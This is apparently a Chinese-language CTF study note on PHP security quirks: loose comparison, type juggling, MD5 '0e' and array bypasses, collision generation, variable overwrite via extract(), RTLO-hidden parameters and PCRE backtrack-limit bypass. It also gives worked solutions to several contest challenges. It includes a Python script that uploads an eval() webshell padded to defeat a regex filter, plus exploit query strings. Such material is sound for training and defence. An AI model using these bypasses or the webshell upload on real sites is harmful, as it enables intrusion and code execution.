# PHP特性

## 类型转换

PHP 是**动态类型**语言，声明变量时不需要定义类型。变量类型转换分为`自动类型转换`和`强制类型转换`。

- `强制类型转换`，通过显式调用进行转换
  - 通过在值前面的括号中写入类型来将值转换指定的类型，如`$bar = (bool) $foo`。
  - 使用`settype()`函数。

- `自动类型转换`，PHP 会尝试在某些上下文中自动将值解释为另一种类型，[类型转换的判别](https://www.php.net/manual/zh/language.types.type-juggling.php)

### 转换为整型

```php
<?php
var_dump(intval(false)); // int(0)
var_dump(intval(true)); // int(1)

var_dump(intval("NULL")); // int(0)

var_dump(intval("123")); // int(123)
var_dump(intval("0a")); // int(0)
var_dump(intval("123a")); // int(123)
var_dump(intval("php")); // int(0)

// PHP 7.1.0，科学计数法
var_dump(intval("1e1")); // int(1)，从PHP 7.1.0 开始，int(10)

// PHP 8.0.0 之后
var_dump(intval(NAN)); // int(0)
var_dump(intval(INF)); // int(0)
var_dump(intval(-INF)); // int(0)
```

### [转换为string](https://www.php.net/manual/zh/language.types.string.php#language.types.string.casting)

- 布尔值`true`转换为"1"
- 布尔值`false`转换为""（空字符串）
- 数组`array`总是转换成字符串"Array"
  - `echo`和`print`无法显示该数组的内容
  - 在反序列化 POP 链经常用到
- 整数、浮点数转换为数字的字面样式的字符串
- 必须使用魔术方法 `__toString` 才能将 `object` 转换为 `string`
- `null`总是被转变成空字符串

```php
// 布尔值`true`转换为"1"
var_dump(strval(true)); //string(1) "1"
var_dump(strval(false)); //string(0) ""
var_dump(strval([])); //string(5) "Array"
var_dump(strval(123)); //string(3) 
var_dump(strval(123.5)); //"123"string(5) "123.5"
var_dump(strval(1e2)); //string(3) "100"
var_dump(strval(null)); // string(0) ""
```

### [转换为布尔值](https://www.php.net/manual/zh/language.types.boolean.php#language.types.boolean.casting)

当转换为`bool`时，以下值被认为是`false`：

- 布尔值`false`本身
- 整型值`0`（零）
- 浮点型值 `0.0`
- 空字符串 ""，以及字符串 "0"
- 不包括任何元素的数组
- 原子类型 NULL（包括尚未赋值的变量）
- 内部对象的强制转换行为重载为 bool。例如：由不带属性的空元素创建的 SimpleXML 对象。

```php
<?php
// bool(false)
var_dump((bool)false);
var_dump((bool)0);
var_dump((bool)0.0);
var_dump((bool)"");
var_dump((bool)"0");
var_dump((bool)[]);
var_dump((bool)null);
```

所有其它值都被认为是 true（包括 资源 和 NAN）。

## 类型比较

不同类型的变量在进行松散比较时会进行`自动类型转换`，[比较运算符](https://www.php.net/manual/zh/language.operators.comparison.php)

- [PHP类型比较表](https://www.php.net/manual/zh/types.comparisons.php)

- 当两个操作对象都是`数字字符串`，或一个是数字另一个是`数字字符串`，就会**自动按照数值**进行比较。此规则也适用于`switch`语句。当比较时用的是 `===` 或 `!==`， 则不会进行类型转换——因为不仅要对比数值，还要对比类型。

> PHP 8.0.0 之前，如果字符串与数字~~或数字字符串~~进行比较，则在比较前会将字符串转换为数字。

```php
<?php
var_dump("0" == 0); // bool(true)
var_dump("123" == 123); // bool(true)
var_dump("1e1" == 1e1); // bool(true)

var_dump("0a" == 0); // bool(true)
var_dump("php" == 0); // bool(true)

// PHP 8.0.0 之后
var_dump("0a" == 0); // bool(false)
var_dump("php" == 0); // bool(false)
```

### 例题分析

#### 例题1

```php
<?php
$num = $_GET['num'];

if ($num == 0 && $num) {
    echo 'flag{**********}';
}
```

当条件 1`$num == 0`和条件 2`$num`均为`bool(true)`时，得到`flag`。

- 条件 1，字符串`$num`等于整数`0`，松散比较。字符串`$num`转换为整型，要求值为整型`0`，可为数字字符串"0"、前导数字字符串(如"0a")、非 numeric 或者前导数字（即纯字符，如"php"）。
- 条件 2，字符串`$num`转换为布尔型。要求值为布尔型`true`,则**不能为空字符串 ""及字符串 "0"**

```bash
// ?num=0a
// ?num=php
// PHP 8以下
```

#### 例题2

```php
<?php
$a = $_GET['a'];
if ($a == 0 && $a == "admin") {
    echo 'flag{**********}';
}
```

```bash
?a=admin
```

## 重要函数

|函数名称|作用|特性|
| --- | --- | --- |
|[is_numeric()](https://www.php.net/manual/zh/function.is-numeric.php)|检测变量是否为数字或数字字符串|科学计数法|
|[intval()](https://www.php.net/manual/zh/function.intval.php)|获取变量的整数值|1. 成功时返回`value`的`integer`值，失败时返回`0`。 空的 array 返回     `0`，非空的`array`返回`1`。<br /> 2. 如果 base 是 0，通过检测 value 的格式来决定使用的进制<br />3. 科学计数法，7.1.0后发现变化|
|[preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php)|执行一个正则表达式的搜索和替换|1.`/e`修饰符，代码执行|
|[preg_match()](https://www.php.net/manual/zh/function.preg-match.php)|执行匹配正则表达式|1.数组返回false <br /> 2. 换行 <br /> 3. 回溯次数限制绕过|
|[in_array()](https://www.php.net/manual/zh/function.in-array.php)、[array_search()](https://www.php.net/manual/zh/function.array-search.php)|检查数组中是否存在某个值|如果没有设置strict，则使用松散比较
|[chr()](https://www.php.net/manual/zh/function.chr.php)|返回指定的字符|1. 如果数字大于256，返回`mod 256`|
|json_decode()||1. 字符串null、不符合json格式的情况返回null|

- json_decode()

```php
var_dump(json_decode('1')); // int(1)
var_dump(json_decode('false')); // bool(false)
var_dump(json_decode('true')); // bool(true)
var_dump(json_decode('null')); // NULL
var_dump(json_decode('a')); // NULL

// key 必须双引号 value 加双引号是字符串，不加是数字
var_dump((array)json_decode('{"key":"value", "2":2,"3":"3"}'));

/*
 array(3) {
  ["key"]=>
  string(5) "value"
  [2]=>
  int(2)
  [3]=>
  string(1) "3"
}
 */

// 嵌套数组
var_dump((array)json_decode('{"a":[1,[2,3],4]}'));
```

### 例题分析

#### 例题1

```php
<?php
$num = $_GET['num'];
// 条件1 $num 不是数字字符串
// 条件2 字符串$num与整数1松散比较相等
// PHP8以下，前导数字字符串 ?num=1a
if (!is_numeric($num) && $num == 1) {
    echo 'flag{**********}';
}

// PHP8以下，前导数字字符串 ?num=1235a
if (!is_numeric($num) && $num > 1234) {
  echo 'flag{**********}';
}

// $num 字符串长度最大为3，最大为999
// 算术操作加法，$num 字符串转换为数字
// 科学计数法 ?num=1e9
if (strlen($num) < 4 && intval($num + 1) > 5000)) {
    echo 'flag{**********}';
}
```

#### 例题2

```php
<?php
highlight_file(__FILE__);

if (isset($_GET['money'])) {
    $money = $_GET['money'];
    if (strlen($money) <= 4 && $money > time() && !is_array($money)) {
        echo 'flag{**********}';
    } else {
        echo "Wrong Answer!";
    }
} else {
    echo "Wrong Answer!";
}
?>
```

?> `$money`为什么不能是数组？假设`$money`是数组，能否满足条件 1 和 2？

在比较运算符中，运算数 1 类型为数组，与任何其他类型比较，数组总是更大。参考[比较运算符](https://www.php.net/manual/zh/language.operators.comparison.php)

```
?money=1e9
?money[]=
```

## 哈希函数比较

计算字符串的散列值[md5()](https://www.php.net/manual/zh/function.md5)、[sha1()](https://www.php.net/manual/zh/function.sha1.php)

### `0e`开头

```php
<?php
// 松散比较不等，md5值相等
if ($str1 != $str2) if (md5($str1) == md5($str2)) die($flag);
```

```
md5('240610708') == md5('QNKCDZO')
```

### 数组绕过

`md5(array)`，如果参数类型为数组，返回`NULL`

```php
<?php
// 原字符串不全等，md5值全等
if ($str1 !== $str2) if (md5($str1) === md5($str2)) die($flag);
if ($str1 !== $str2) if (md5($salt.$str1) === md5($salt.$str2)) die($flag);

// ?a[]=..&b[]=...
```

### [不同的数值构建一样的MD5]()

```php
// 原字符串不全等，md5值全等
if ((string)$str1 !== (string)$str2) if (md5($str1) === md5($str2)) die($flag);
```

- 选择前缀碰撞
- 相同前缀碰撞，在两个不同的文件中共享相同的前缀和后缀，但中间的二进制不同。
[HashClash](https://www.win.tue.nl/hashclash/) 是一个用于 MD5 和 SHA-1 密码分析的工具箱，由 cr-marcstevens 开发。它可以用于创建不同类型的碰撞，包括选择前缀碰撞和相同前缀碰撞。
使用已编译好的 Win32 工具[fastcoll_v1.0.0.5.exe](https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)可以在几秒内完成任务，过程如下：

```shell
# -p pre.txt 为前缀文件 -o 输出两个md5一样的文件
.\fastcoll_v1.0.0.5.exe -p pre.txt -o msg1.bin msg2.bin
```

生成的两个不同的文件，便于发送，进行 URL 编码

```php
<?php
echo "msg1:" . urlencode(file_get_contents("msg1.bin")) . PHP_EOL;
echo "msg2:" . urlencode(file_get_contents("msg2.bin")) . PHP_EOL;

/*
msg1:yes%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C3%DF%00W%ABi%1BR%EF%F5%FC%22%F6%E9%F8%F2%03%21%AF4v%3A%9B%E6W%B6A%95H%B8D%07%A9%DB%CC%DE%BC%E3%A2%1A%87%BAg%DB%DC%DB1%B4%9Da%5D%E8%E4%D0%D4%F4%EC%00%96c%A2%8B%1E%18%16%0AvrJ%E7%98%96X1%27I%D2%CE%28%1E%9Avb4%1C%EA%00%3D%24%5D%A4e%CF%EB-%EE%D1%27%7FX%98%9A%B1%C8bJ%09j%85%7C%AE%5C%12%7D%26%F3Y%BF%23%18%81%96%D1%FF%B8%E7Z%8B

msg2:yes%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C3%DF%00W%ABi%1BR%EF%F5%FC%22%F6%E9%F8%F2%03%21%AF%B4v%3A%9B%E6W%B6A%95H%B8D%07%A9%DB%CC%DE%BC%E3%A2%1A%87%BAg%DB%DC%5B2%B4%9Da%5D%E8%E4%D0%D4%F4%EC%00%96%E3%A2%8B%1E%18%16%0AvrJ%E7%98%96X1%27I%D2%CE%28%1E%9Avb%B4%1C%EA%00%3D%24%5D%A4e%CF%EB-%EE%D1%27%7FX%98%9A%B1%C8bJ%09j%85%FC%AD%5C%12%7D%26%F3Y%BF%23%18%81%96%D1%7F%B8%E7Z%8B
*/
```

- [Project HashClash - MD5 & SHA-1 cryptanalytic toolbox](https://github.com/cr-marcstevens/hashclash)
- [GitHub - corkami/collisions: Hash collisions and exploitations](https://github.com/corkami/collisions)

### 字符串的MD5值等于其本身

```php
if($str == md5($str)) die($flag);
```

寻找一个`0e`开头的字符串，且其 md5 值也是`0e`开头。

```php
<?php
for($i;;$i++) if("0e{$i}" == md5("0e{$i}")) die("0e{$i}"); 
# 输出 0e215962017
```

### 截断比较

哈希字符串的指定位置等于某字符串

```php
if(substr(md5($str), 0, 6) == "******") die($flag);
```

采用暴力碰撞方式

```php
<?php
for($i;;$i++) if(substr(md5($i), 0, 6) == "******") die("$i"); 
```

### `md5($str,true)`

与 SQL 注入结合
<!--
与SQL注入结合
-->
练习题目

- 2017-HackDatKiwi-md5games1
- 2018-强网杯-web 签到

## 变量覆盖漏洞

变量覆盖漏洞是指通过自定义参数值控制原有变量的值。

- [可变变量`$$`](https://www.php.net/manual/zh/language.variables.variable.php) - 一个变量的变量名可以动态设置和使用
- [parse_str()](https://www.php.net/manual/zh/function.parse-str.php) - 将字符串解析成多个变量
- [extract()](http://php.adamharvey.name/manual/zh/function.extract.php) - 从数组中导入变量到当前符号表
- [import_request_variables()](http://php.adamharvey.name/manual/zh/function.import-request-variables.php) -  将 GET／POST／Cookie 变量导入全局作用域

### 例题分析

题目来源：ISCC_2019_web4

```php
<?php
error_reporting(0);
include("flag.php");
$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a';
$parsed = parse_url($_SERVER['REQUEST_URI']);
if (isset($parsed["query"])) {
    $query = $parsed["query"];
    $parsed_query = parse_str($query);
    if ($parsed_query != NULL) {
        $action = $parsed_query['action'];
    }

    if ($action === "auth") {
        $key = $_GET["key"];
        $hashed_input = hash('sha256', $key);
        if ($hashed_input !== $hashed_key) {
            die("<img src='cxk.jpg'>");
        }

        echo $flag;
    }
} else {
    show_source(__FILE__);
}
```

## 双引号字符串中含有`RTLO`等格式字符

[格式字符介绍](https://www.w3.org/International/questions/qa-bidi-unicode-controls#basedirection)

RTLO 字符，全称为 Right-to-Left Override，是一个 Unicode 控制字符，编码为 U+202E。它的作用是改变文本的显示方向，使其从右向左显示，这对于支持阿拉伯语、希伯来语等从右向左书写的语言非常有用。

```php
echo "\u{202E}abc"; // cba
```

PHP 的代码高亮函数，其颜色显示是根据`php.ini`定义显示，注释、默认、HTML、关键词和字符串显示不同颜色。

![](http://oss.dropsec.xyz/book/phpinfo-highlight.png)

假设我们需要遇到这样一道题目，浏览器显示源码如图所示。

![](http://oss.dropsec.xyz/book/RTLO1.png)

图中有三个注释，其中第三个`//sha2`显示的颜色与前两个不同。原因在于真正的`$_GET`参数不是所谓看见的`sha2`，而是包含有控制字符的字符串，导致浏览器渲染显示时产生位置偏移，我们需要从十六进制层面获取真正的参数名称。可通过`burp`或`wireshark`抓包，也可以直接复制粘贴代码，获取参数值。由于是不可打印字符，发送时需要 URL 编码。

在做题中，可以通过颜色判断或者鼠标双击选择变量，来发现是否设置了考点。

- Hack.lu CTF 2018 Baby PHP
- ISCC 2023 小周的密码锁

## 浮点数精度绕过

- 在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了
- 常量
  - `NaN`，
  - `INF`，无穷大

- 题目
  - ciscn2020-easytrick

## PCRE回溯次数限制绕过

例题[Code-Breaking Puzzles](https://code-breaking.com/)的[pcrewaf](https://github.com/phith0n/code-breaking/tree/master/2018/pcrewaf)

```php
<?php
// 判断是否是PHP代码
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

// 注意preg_match()的返回值，返回0 或false均满足条件
if(!is_php($input)) {
    // fwrite($f, $input); ...
}
```

PCRE（Perl Compatible Regular Expressions）是一个 Perl 语言兼容的正则表达式库。PHP 采用 PCRE 库实现正则表达式功能。

默认情况下，量词都是`贪婪`的，也就是说， 它们会在不导致模式匹配失败的前提下，尽可能多的匹配字符(直到最大允许的匹配次数)。

然而，如果一个量词紧跟着一个`?`(问号) 标记，它就会成为懒惰(非贪婪)模式， 它不再尽可能多的匹配，而是尽可能少的匹配。

`<?php phpinfo();?>//aaaaaa`，执行过程如下：

PCRE 的参数回溯次数限制`pcre.backtrack_limit`默认为`1000000`。

如果回溯次数超过限制，`preg_match()`返回`false`，表示只执行失败。

PCRE 回溯次数限制绕过的原理是通过发送超长字符串，使正则执行失败，最后绕过目标对 PHP 语言的限制。

- 贪婪模式
- 对返回值的判断不够严谨

```python
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)
```

### 修复建议

PHP 文档上有关于`preg_match`的警告，应使用全等`===`来测试函数的返回值。

```php
<?php
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

if(is_php($input) === 0) {
    // fwrite($f, $input); ...
}
```

[PCRE库](https://www.pcre.org/)

[PHP正则表达式文档](https://www.php.net/manual/zh/book.pcre.php)

<https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html>

## 经典赛题分析

### 2021-强网杯-寻宝

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

// 过滤函数，将黑名单字符替换为空
function filter($string)
{
    $filter_word = array('php', 'flag', 'index', 'KeY1lhv', 'source', 'key', 'eval', 'echo', '\$', '\(', '\.', 'num', 'html', '\/', '\,', '\'', '0000000');
    $filter_phrase = '/' . implode('|', $filter_word) . '/';
    return preg_replace($filter_phrase, '', $string);
}

if ($ppp) {
    unset($ppp);
}
$ppp['number1'] = "1";
$ppp['number2'] = "1";
$ppp['nunber3'] = "1";
$ppp['number4'] = '1';
$ppp['number5'] = '1';

// 变量覆盖漏洞
extract($_POST);

$num1 = filter($ppp['number1']);
$num2 = filter($ppp['number2']);
$num3 = filter($ppp['number3']);
$num4 = filter($ppp['number4']);
$num5 = filter($ppp['number5']);

// $num1不能为数字字符串
if (isset($num1) && is_numeric($num1)) {
    die("非数字");
} else {
 // 前导数字字符串，松散比较，num1=1025a
    if ($num1 > 1024) {
        echo "第一层";
  // 科学计数法，$num2=5e5
        if (isset($num2) && strlen($num2) <= 4 && intval($num2 + 1) > 500000) {
            echo "第二层";
   // md5截断碰撞，$num3=61823470
            if (isset($num3) && '4bf21cd' === substr(md5($num3), 0, 7)) {
                echo "第三层";
    // 前导数字字符串0或纯字母字母串，$num4=aaaaaaa
                if (!($num4 < 0) && ($num4 == 0) && ($num4 <= 0) && (strlen($num4) > 6) && (strlen($num4) < 8) && isset($num4)) {
                    echo "第四层";
                    if (!isset($num5) || (strlen($num5) == 0)) die("no");
     // json_decode返回值，通过恰当的 PHP 类型返回在 json 中编码的数据。值 true、false 和 null 会相应地返回 true、false 和 null。如果 json 无法被解码，或者编码数据深度超过了嵌套限制的话，将会返回 null 。
     // 1. $num5=null 2. $num5=a
                    $b = json_decode(@$num5);
                    if ($y = $b === NULL) {
                        if ($y === true) {
                            echo "第五层";
                            include 'flag.php';
                            echo $flag;
                        }
                    } else {
                        die("no");
                    }
                } else {
                    die("no");
                }
            } else {
                die("no");
            }
        } else {
            die("no");
        }
    } else {
        die("no111");
    }
}
```

EXP:

```php
ppp[number1]=1025a&ppp[number2]=5e5&ppp[number3]=61823470&ppp[number4]=0aaaaaa&ppp[number5]=a
或
ppp[number1]=1025a&ppp[number2]=5e5&ppp[number3]=61823470&ppp[number4]=abcdefg&ppp[number5]=null
```

### 2022-ISCC-冬奥会

```php
<?php

show_source(__FILE__);

$Step1 = False;
$Step2 = False;

$info = (array)json_decode(@$_GET["Information"]);

if (is_array($info)) {

 var_dump($info);
    //  不能是数字或数字字符串
 is_numeric(@$info["year"]) ? die("Sorry~") : NULL;
 if (@$info["year"]) {
        // 字符串与数字松散比较，前导数字字符串 $info["year"]='2022a'
  ($info["year"] == 2022) ? $Step1 = True : NULL;
 }
    // $info["items"]必须是数组
 if (is_array(@$info["items"])) {
        // $info["items"][1] 是数组
        // $info["items"]数组元素数量=3
  if (!is_array($info["items"][1]) or count($info["items"]) !== 3) die("Sorry~");
  // array_search() 松散比较，0 == "skiing"
        $status = array_search("skiing", $info["items"]);
  $status === false ? die("Sorry~") : NULL;
  foreach ($info["items"] as $key => $val) {
   $val === "skiing" ? die("Sorry~") : NULL;
  }
  $Step2 = True;
 }
}

if ($Step1 && $Step2) {
 include "2022flag.php";
 echo $flag;
}
```

```
?Information={"year":"2022a","items":["a",[],0]}
```

### 2023-ISCC-小周的密码锁

```php
<?php
function MyHashCode($str) {
 $h = 0;
 $len = strlen($str);
 for ($i = 0; $i < $len; $i++) {
  $hash = intval40(intval40(40 * $hash) + ord($str[$i]));
 }
 return abs($hash);
}

function intval40($code) {
 // 位运算符，$code 向右移动32位
 $falg = $code >> 32;
 // $code向右移动32位后，若等于1
 // $code 范围在 2的32次方---2的33次方-1
 if ($falg == 1) {
  // 位运算符，取反
  $code = ~($code - 1);
  return $code * -1;
 } else {
  // $code向右移动32位后，不等于1
  return $code;
 }
}
function Checked($str) {
 $p1 = '/ISCC/';
 if (preg_match($p1, $str)) {
  return false;
 }
 return true;
}

function SecurityCheck($sha1, $sha2, $user) {

 $p1 = '/^[a-z]+$/';
 $p2 = '/^[A-Z]+$/';

 if (preg_match($p1, $sha1) && preg_match($p2, $sha2)) {
  $sha1 = strtoupper($sha1);
  $sha2 = strtolower($sha2);
  $user = strtoupper($user);
  $crypto = $sha1 ^ $sha2;
 } else {
  die("wrong");
 }

 return array($crypto, $user);
}
error_reporting(0);

$user = $_GET['username']; //user
$sha1 = $_GET['sha1']; //sha1

// 注意 颜色区别，需要获取真正的参数
$sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];
//‮⁦see me ⁩⁦can you

if (isset($_GET['password'])) {
 if ($_GET['password2'] == 5) {
  show_source(__FILE__);
 } else {
  //Try to encrypt
  if (isset($sha1) && isset($sha2) && isset($user)) {
   [
    $crypto,
    $user
   ] = SecurityCheck($sha1, $sha2, $user);
            // 哈希函数的截断碰撞
            // 设 $crypto === $user
   if ((substr(sha1($crypto), -6, 6) === substr(sha1($user), -6, 6)) && (substr(sha1($user), -6, 6)) === 'a05c53') {
    //welcome to ISCC

                // $_GET['password'] 不能包含 ISCC
    if ((MyHashcode("ISCCNOTHARD") === MyHashcode($_GET['password'])) && Checked($_GET['password'])) {
     include("f1ag.php");
     echo $flag;
    } else {
     die("就快解开了!");
    }
   } else {
    die("真的想不起来密码了吗?");
   }
  } else {
   die("密钥错误!");
  }
 }
}

mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));
?>
```

1. `$_GET['username']`哈希函数的截断碰撞，`username=14987637`

```php
for($i;;$i++) if(substr(sha1($i), -6, 6) == "a05c53") die("$i");
// 14987637
```

2. 取`$sha1='AAAAAAAA'`，得`$sha2=puxyvwrv`

```php
echo '14987637' ^ 'AAAAAAAA'; // puxyvwrv
```

3. 调试代码

```
73  73
83  3003
67  120187
67  4807547
78  192301958
yesyes79  7692078399
84  307683136044
72  12307325441832
65  492293017673345
82  19691720706933882
68  787668828277355348
787668828277355348
```

观察发现，在`intval40`参数值范围在 $2^{32}$~$2^{33}-1$，满足条件`$falg == 1`，其余情况，原样返回。我们只需破坏`ISCC`关键词，依然包含上方的流程，`%01%43SCCNOTHARD`

EXP:

```
?username=14987637&password=%01!SCCNOTHARD&%E2%80%AE%E2%81%A6//sha2%E2%81%A9%E2%81%A6sha2=AAAAAAAA&sha1=puxyvwrv
```
